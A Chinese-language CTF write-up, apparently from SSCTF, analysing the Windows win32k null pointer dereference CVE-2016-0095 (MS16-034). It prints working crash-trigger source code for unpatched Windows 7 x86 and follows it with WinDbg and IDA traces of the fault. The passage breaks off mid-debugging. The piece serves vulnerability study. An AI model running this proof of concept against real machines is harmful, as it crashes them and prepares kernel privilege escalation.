# 0x00：前言
本篇文章从SSCTF中的一道Kernel
Pwn题目来分析CVE-2016-0095(MS16-034)，CVE-2016-0095是一个内核空指针解引用的漏洞，这道题目给了poc，要求我们根据poc写出相应的exploit，利用平台是Windows
7 x86 sp1(未打补丁)
# 0x01：漏洞原理
题目给了我们一个poc的源码，我们查看一下源码，这里我稍微对源码进行了修复，在VS上测试可以编译运行
    /**
    * Author: bee13oy of CloverSec Labs
    * BSoD on Windows 7 SP1 x86 / Windows 10 x86
    * EoP to SYSTEM on Windows 7 SP1 x86
    **/
    #include
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "user32.lib")
    #ifndef W32KAPI
    #define W32KAPI  DECLSPEC_ADDRSAFE
    #endif
    unsigned int demo_CreateBitmapIndirect(void) {
        static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
        static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,
            0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };
        bitmap.bmBits = bits;
        SetLastError(NO_ERROR);
        HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);
        return (unsigned int)hBitmap;
    }
    #define eSyscall_NtGdiSetBitmapAttributes 0x1110
    W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
        HBITMAP argv0,
        DWORD argv1
    )
    {
        HMODULE _H_NTDLL = NULL;
        PVOID addr_kifastsystemcall = NULL;
        _H_NTDLL = LoadLibrary(TEXT("ntdll.dll"));
        addr_kifastsystemcall = (PVOID)GetProcAddress(_H_NTDLL, "KiFastSystemCall");
        __asm
        {
            push argv1;
            push argv0;
            push 0x00;
            mov eax, eSyscall_NtGdiSetBitmapAttributes;
            mov edx, addr_kifastsystemcall;
            call edx;
            add esp, 0x0c;
        }
    }
    void Trigger_BSoDPoc() {
        HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
        HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);
        RECT rect = { 0 };
        rect.left = 0x368c;
        rect.top = 0x400000;
        HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);
        HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
        SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);
        HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);
        FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
    }
    int main()
    {
        Trigger_BSoDPoc();
        return 0;
    }
编译之后在win 7
x86中运行发现蓝屏，我们在windbg中回溯一下，可以发现我们最后问题出在在win32k模块中的`bGetRealizedBrush`函数
    3: kd> g
    Access violation - code c0000005 (!!! second chance !!!)
    win32k!bGetRealizedBrush+0x38:
    95d40560 f6402401        test    byte ptr [eax+24h],1
    3: kd> k
     # ChildEBP RetAddr  
    00 97e509a0 95d434af win32k!bGetRealizedBrush+0x38
    01 97e509b8 95db9b5e win32k!pvGetEngRbrush+0x1f
    02 97e50a1c 95e3b6e8 win32k!EngBitBlt+0x337
    03 97e50a54 95e3bb9d win32k!EngPaint+0x51
    04 97e50c20 83e3f1ea win32k!NtGdiFillRgn+0x339
    05 97e50c20 77c170b4 nt!KiFastCallEntry+0x12a
我们在此时在windbg中查看一下`byte ptr [eax+24h]`的内容，发现`eax+24`根本没有映射内存，此时的eax为0
    3: kd> dd eax+24
    00000024  ???????? ???????? ???????? ????????
    00000034  ???????? ???????? ???????? ????????
    00000044  ???????? ???????? ???????? ????????
    00000054  ???????? ???????? ???????? ????????
    00000064  ???????? ???????? ???????? ????????
    00000074  ???????? ???????? ???????? ????????
    00000084  ???????? ???????? ???????? ????????
    00000094  ???????? ???????? ???????? ????????
    3: kd> r
    eax=00000000 ebx=97e50af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe973ae8
    eip=95d40560 esp=97e50928 ebp=97e509a0 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
    win32k!bGetRealizedBrush+0x38:
    95d40560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??
我们在IDA中分析一下该函数的基本结构，首先我们可以得到这个函数有三个参数，两个结构体指针，一个函数指针，中间的哪个参数我重命名了一下
    int __stdcall bGetRealizedBrush(struct BRUSH *a1, struct EBRUSHOBJ *EBRUSHOBJ, int (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, unsigned int))
    {
        ...
    }
我们在汇编中找一下蓝屏代码的位置，继续追根溯源，可以发现eax是由`[ebx+34h]`得到的
    loc_95D40543:
    push    ebx
    mov     ebx, [ebp+EBRUSHOBJ]
    push    esi
    xor     esi, esi
    mov     [ebp+var_24], eax
    mov     eax, [ebx+34h] => eax初始赋值处
    mov     [ebp+arg_0], esi
    mov     [ebp+var_2C], esi
    mov     [ebp+var_28], 0
    mov     eax, [eax+1Ch] => 取eax+1c处的内容
    mov     [ebp+EBRUSHOBJ], eax
    test    byte ptr [eax+24h], 1 => 蓝屏
    mov     [ebp+var_1C], esi
    mov     [ebp+var_10], esi
    jz      short loc_95D4057A
我们在windbg中查询一下`[ebx+34h]`的结构，发现 +1c 处确实是零，直接拿来引用就会因为没有映射内存而崩溃
    3: kd> dd poi(ebx+34h)
    fdad0da8  288508aa 00000001 80000000 889c4800
    fdad0db8  00000000 288508aa 00000000 00000000
    fdad0dc8  00000008 00000008 00000020 fdad0efc
    fdad0dd8  fdad0efc 00000004 00002267 00000001
    fdad0de8  02010000 00000000 04000000 00000000
    fdad0df8  ffbff968 00000000 00000000 00000000
    fdad0e08  00000000 00000000 00000001 00000000
    fdad0e18  00000000 00000000 00000000 00000000
    3: kd> dd poi(ebx+34h)+1c
    fdad0dc4  00000000 00000008 00000008 00000020
    fdad0dd4  fdad0efc fdad0efc 00000004 00002267
    fdad0de4  00000001 02010000 00000000 04000000
    fdad0df4  00000000 ffbff968 00000000 00000000
    fdad0e04  00000000 00000000 00000000 00000001
    fdad0e14  00000000 00000000 00000000 00000000
    fdad0e24  00000000 00000000 fdad0e2c fdad0e2c
    fdad0e34  00000000 00000000 00000000 00000000
我们现在需要知道这个 +1c
处的内容是什么意思，根据刚才的回溯信息，我们在最外层的`win32k!NtGdiFillRgn+0x339`的前一句，也就是调用`EngPaint`之前下断点观察堆栈情况
    0: kd> u win32k!NtGdiFillRgn+0x334
    win32k!NtGdiFillRgn+0x334:
    95e3bb98 e8fafaffff      call    win32k!EngPaint (95e3b697)
    95e3bb9d 897dfc          mov     dword ptr [ebp-4],edi
    95e3bba0 8d4dc4          lea     ecx,[ebp-3Ch]
    95e3bba3 e882000000      call    win32k!BRUSHSELOBJ::vDecShareRefCntLazy0 (95e3bc2a)
    95e3bba8 8d4dc4          lea     ecx,[ebp-3Ch]
    95e3bbab e8258ff7ff      call    win32k!BRUSHSELOBJ::~BRUSHSELOBJ (95db4ad5)
    95e3bbb0 8d8dd8feffff    lea     ecx,[ebp-128h]
    95e3bbb6 e8d508f9ff      call    win32k!EBRUSHOBJ::vDelete (95dcc490)
    0: kd> ba e1 win32k!NtGdiFillRgn+0x334
    0: kd> g
    Breakpoint 1 hit
    win32k!NtGdiFillRgn+0x334:
    95e3bb98 e8fafaffff      call    win32k!EngPaint (95e3b697)
    0: kd> dd esp